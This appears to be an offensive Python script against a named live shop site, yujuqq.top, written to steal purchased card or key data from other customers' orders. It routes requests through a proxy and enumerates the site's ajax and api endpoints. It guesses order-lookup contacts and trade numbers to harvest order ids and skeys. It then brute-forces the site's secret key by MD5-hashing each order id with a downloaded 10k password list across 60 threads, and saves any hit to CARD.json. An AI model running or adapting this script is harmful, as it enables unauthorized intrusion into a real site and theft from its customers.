#!/usr/bin/env python3
"""yujuqq.top 深挖 — 280单小规模，优先 SYS_KEY 爆破 + query HTML + api.php."""
from __future__ import annotations

import concurrent.futures
import hashlib
import itertools
import json
import re
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

BASE = "https://yujuqq.top/shop"
OUT = Path(f"/tmp/yujuqq_scan_{int(time.time())}")
OUT.mkdir(exist_ok=True)
CK = str(OUT / "cookies.jar")


def refresh_proxy() -> str:
    fetch = Path("/data/automation/bin/qg-proxy-fetch.sh")
    env = Path("/data/config/proxy.env")
    if fetch.is_file():
        subprocess.run([str(fetch)], capture_output=True)
    if env.is_file():
        for line in env.read_text().splitlines():
            if line.startswith("PROXY_URL="):
                return line.split("=", 1)[1].strip()
    return ""


PX = refresh_proxy()  # empty = direct
SHOW = re.compile(r"showOrder\((\d+),\s*'([^']+)'\)")


def curl(url: str, data: str | None = None, referer: str | None = None) -> str:
    cmd = [
        "curl", "-sk", "--max-time", "15", "-c", CK, "-b", CK,
        "-A", "Mozilla/5.0", "-H", "Accept-Language: zh-CN,zh;q=0.9",
        "-H", "X-Requested-With: XMLHttpRequest",
    ]
    if PX:
        cmd[4:4] = ["-x", PX]
    if referer:
        cmd += ["-H", f"Referer: {referer}"]
    if data is not None:
        cmd += ["-X", "POST", "-d", data]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def log(msg: str) -> None:
    print(msg, flush=True)
    (OUT / "log.txt").open("a").write(msg + "\n")


def main() -> int:
    log(f"proxy={PX[:50]}... out={OUT}")
    curl(f"{BASE}/", referer="https://yujuqq.top/")

    gc = json.loads(curl(f"{BASE}/ajax.php?act=getcount", referer=f"{BASE}/"))
    orders = int(gc["orders"])
    log(f"getcount={json.dumps(gc, ensure_ascii=False)}")

    findings: list[dict] = []

    # getclass / gettool
    classes = json.loads(curl(f"{BASE}/ajax.php?act=getclass", referer=f"{BASE}/"))
    for c in classes.get("data", [])[:5]:
        cid = c["cid"]
        tools = json.loads(curl(f"{BASE}/ajax.php?act=gettool&cid={cid}", referer=f"{BASE}/"))
        n = len(tools.get("data", []))
        log(f"cid={cid} tools={n}")
        if n and tools["data"]:
            t = tools["data"][0]
            log(f"  sample tid={t['tid']} name={t.get('name','')[:40]} price={t.get('price')}")

    # api.php (GET often reset; try POST body fallback)
    for act, extra in [
        ("search", "id=1"),
        ("siteinfo", ""),
        ("orders", ""),
        ("checkkm", "tid=1&km=test"),
    ]:
        url = f"{BASE}/api.php?act={act}" + (f"&{extra}" if extra and "=" in extra else "")
        body = curl(url, referer=f"{BASE}/")
        if not body.strip() and extra:
            body = curl(f"{BASE}/api.php?act={act}", data=extra, referer=f"{BASE}/")
        if body.strip():
            log(f"api act={act} => {body[:200]}")
            findings.append({"type": "api", "act": act, "body": body[:500]})

    # query HTML contacts
    contacts = ["123456", "888888", "666666", "a123456", "qq123456", "5201314", "password", "test", "admin"]
    contacts += [f"{i}@qq.com" for i in range(10000, 10100)]
    for c in contacts:
        body = curl(f"{BASE}/?mod=query&data={c}", referer=f"{BASE}/?mod=query")
        for m in SHOW.finditer(body):
            log(f"CONTACT HIT {c} => id={m.group(1)} skey={m.group(2)}")
            findings.append({"type": "contact", "c": c, "id": m.group(1), "skey": m.group(2)})

    # tradeno scan today
    prefix = datetime.now().strftime("%Y%m%d")
    tns = [f"{prefix}{h:02d}{m:02d}{s:02d}{suf:03d}"
           for h in range(24) for m in range(0, 60, 5) for s in (0, 30)
           for suf in range(0, 1000, 50)]
    tns = [t for t in dict.fromkeys(tns) if len(t) == 17][:500]
    for tn in tns:
        body = curl(f"{BASE}/?mod=query&data={tn}", referer=f"{BASE}/?mod=query")
        for m in SHOW.finditer(body):
            log(f"TRADENO HIT {tn} => {m.group(1)} {m.group(2)}")
            findings.append({"type": "tradeno", "tn": tn, "id": m.group(1), "skey": m.group(2)})

    # fetch kminfo from hits
    card = None
    for f in findings:
        if f.get("skey"):
            body = curl(f"{BASE}/ajax.php?act=order", data=f"id={f['id']}&skey={f['skey']}", referer=f"{BASE}/?mod=query")
            log(f"ORDER {f['id']} => {body[:400]}")
            if "kminfo" in body or '"code":0' in body:
                card = body
                (OUT / "CARD.json").write_text(body)
                break

    # SYS_KEY brute — only 280 orders, full 10k wordlist feasible
    if not card:
        log("SYS_KEY brute...")
        words = subprocess.check_output(
            ["curl", "-fsSL",
             "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"],
            text=True,
        ).splitlines()
        extra = [
            "yujuqq", "yujuqq.top", "yuju", "htqq", "faka", "rainbow", "caihong",
            "345a36b5fa7be2bdd2f1724157952938", "b0750180cd456b7d6efc2217f10226dd",
            "123456", "admin", "674", str(orders), "38814",
        ]
        words = list(dict.fromkeys(extra + [w.strip() for w in words if w.strip()]))
        ids = list(range(1, orders + 1))

        def brute(pair: tuple[int, str]) -> tuple[int, str, str] | None:
            oid, w = pair
            sk = hashlib.md5(f"{oid}{w}{oid}".encode()).hexdigest()
            body = curl(f"{BASE}/ajax.php?act=order", data=f"id={oid}&skey={sk}", referer=f"{BASE}/?mod=query")
            if '"code":0' in body or "kminfo" in body:
                return oid, w, body
            return None

        pairs = list(itertools.product(ids, words))
        log(f"brute pairs={len(pairs)}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=60) as ex:
            for i, res in enumerate(ex.map(brute, pairs, chunksize=300)):
                if res:
                    log(f"*** SYS_KEY HIT id={res[0]} key={res[1]!r} ***")
                    log(res[2][:800])
                    card = res[2]
                    (OUT / "CARD.json").write_text(card)
                    (OUT / "SYS_KEY.txt").write_text(res[1])
                    findings.append({"type": "SYS_KEY", "id": res[0], "key": res[1]})
                    ex.shutdown(cancel_futures=True)
                    break
                if i and i % 50000 == 0:
                    log(f"brute progress {i}/{len(pairs)}")

    (OUT / "findings.json").write_text(json.dumps(findings, ensure_ascii=False, indent=2))
    log(f"DONE card={'YES' if card else 'NO'} findings={len(findings)}")
    return 0 if card else 2


if __name__ == "__main__":
    sys.exit(main())
